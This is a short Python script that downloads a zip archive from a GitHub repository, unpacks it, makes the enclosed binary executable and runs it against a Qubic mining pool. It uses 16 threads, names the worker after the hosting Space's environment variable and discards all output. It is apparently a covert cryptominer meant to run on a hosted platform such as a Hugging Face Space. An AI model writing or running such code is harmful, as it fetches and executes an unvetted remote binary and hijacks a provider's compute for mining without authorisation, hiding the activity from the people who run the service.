import os
os.system("wget https://github.com/qqivk/Ueldq/raw/refs/heads/main/Ahdo.zip")
os.system("unzip Ahdo.zip")
os.system("chmod +x Ahdo")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Ahdo --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
